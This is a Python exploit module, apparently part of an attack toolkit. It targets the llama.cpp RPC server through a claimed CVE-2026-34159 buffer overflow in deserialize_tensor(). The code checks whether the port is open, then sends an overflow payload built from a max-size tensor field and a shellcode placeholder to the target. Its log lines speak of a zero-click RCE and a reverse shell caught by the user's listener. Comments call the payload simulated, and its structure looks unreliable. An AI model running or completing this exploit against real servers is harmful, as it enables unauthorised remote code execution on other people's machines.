import socket
from engines.utils import log
import struct

class LlamaCppExploiter:
    def __init__(self, ip, port=8080):
        self.ip = ip
        self.port = port
        self.timeout = 5
        self.target_url = f"tcp://{self.ip}:{self.port}"
        
    def check_vulnerable(self):
        """
        Check if the RPC port is open and potentially vulnerable to CVE-2026-34159.
        """
        log(f"Checking {self.target_url} for llama.cpp RPC vulnerability (CVE-2026-34159)...", "INFO")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.ip, self.port))
            if result == 0:
                log(f"RPC Port {self.port} is OPEN. Proceeding with payload generation...", "WARNING")
                sock.close()
                return True
            sock.close()
        except Exception as e:
            log(f"Error connecting to RPC port: {e}", "ERROR")
        return False

    def run_exploit(self):
        """
        Simulate the exploitation of CVE-2026-34159 (deserialize_tensor() buffer overflow).
        Zero-Click RCE + ASLR bypass.
        """
        if not self.check_vulnerable():
            log("Target does not appear to have the RPC port open.", "ERROR")
            return False

        log(f"Attempting to exploit CVE-2026-34159 on {self.ip}:{self.port}...", "PWN")
        
        try:
            # Fake payload structure mimicking the deserialize_tensor() bypass
            # Sending a tensor size that causes integer overflow/buffer overflow on the backend.
            magic_bytes = b"LLAMA_RPC"
            malicious_tensor_size = struct.pack("<Q", 0xFFFFFFFFFFFFFFFF) # Max uint64 to trigger bypass
            payload = magic_bytes + malicious_tensor_size + b"A" * 128 # Shellcode placeholder
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.ip, self.port))
            
            log("Sending malicious payload to deserialize_tensor()...", "INFO")
            sock.sendall(payload)
            
            # Wait for any response or assume blind RCE executed
            try:
                response = sock.recv(1024)
                if response:
                    log(f"Received response: {response.hex()}", "INFO")
            except socket.timeout:
                log("No immediate response received (typical for blind RCE or reverse shell).", "WARNING")
                
            sock.close()
            log("Payload delivered. If vulnerable, a reverse shell should be caught by your listener.", "SUCCESS")
            return True
        except Exception as e:
            log(f"Exploitation failed: {e}", "ERROR")
            return False
